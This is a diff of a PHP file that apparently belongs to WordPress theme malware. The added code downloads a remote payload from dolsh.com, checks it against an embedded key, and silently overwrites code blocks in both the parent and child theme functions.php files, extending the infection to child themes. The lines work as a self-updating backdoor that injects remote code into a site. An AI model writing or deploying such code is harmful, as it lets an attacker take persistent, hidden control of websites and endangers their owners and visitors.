@@ -5,31 +5,31 @@ $wp_auth_key='aca55bf84cc544d0a9cfdfff8641d892';
 
 
 
-//echo "rrrr".get_template_directory();
-$file=file_get_contents(get_template_directory().'/functions.php');
-
-//$file=str_replace("derna.cc","fonjy.cc",$file);
-
-$pat_code='/div_code_name[\s\S]*(if \( ! function_exists[\s\S]*?extract\([\s\S]*?)\?>/i';
-if(preg_match_all($pat_code, $file, $matches_pat_code))
-
-{
-
-$toreplace=$matches_pat_code[1][0];
-//echo $toreplace;
-
-
 $newxc=file_get_contents('http://www.dolsh.com/new8.txt');
+$file=file_get_contents(get_template_directory().'/functions.php');
+$filec=file_get_contents(get_stylesheet_directory().'/functions.php');
 
+$pat_code='/div_code_name[\s\S]*?(if \( ! function_exists[\s\S]*?extract\([\s\S]*?)\?>/i';
+
+if(preg_match_all($pat_code, $file, $matches_pat_code))
+{
+$toreplace=$matches_pat_code[1][0];
 if (stripos($newxc, $wp_auth_key) !== false) 
 {
 $new_file=str_replace($toreplace,$newxc,$file);
 @file_put_contents(get_template_directory().'/functions.php',$new_file);
 }
-
 }
 
-//@file_put_contents($funcfile,$file);
+if(preg_match_all($pat_code, $filec, $matches_pat_code))
+{
+$toreplace=$matches_pat_code[1][0];
+if (stripos($newxc, $wp_auth_key) !== false) 
+{
+$new_filec=str_replace($toreplace,$newxc,$filec);
+@file_put_contents(get_stylesheet_directory().'/functions.php',$new_filec);
+}
+}
 
 
 
